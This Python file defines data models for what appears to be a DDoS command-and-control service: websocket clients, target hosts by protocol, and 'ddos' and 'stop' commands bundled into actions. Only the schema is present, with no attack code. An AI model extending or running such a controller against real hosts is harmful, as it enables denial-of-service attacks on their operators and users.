from typing import Union, Literal
from dataclasses import dataclass
from pydantic import BaseModel
from sanic.server.websockets.impl import WebsocketImplProtocol


@dataclass
class Client:
    ws: WebsocketImplProtocol


class Target(BaseModel):
    host: str
    protocol: Union[Literal['http'], Literal['https'], Literal['ws'], Literal['tcp']]


class BaseCommand(BaseModel):
    title: str


class CommandDDOS(BaseCommand):
    title = "ddos"


class CommandStop(BaseCommand):
    title = "stop"


class Action(BaseModel):
    command: BaseCommand
    target: Target


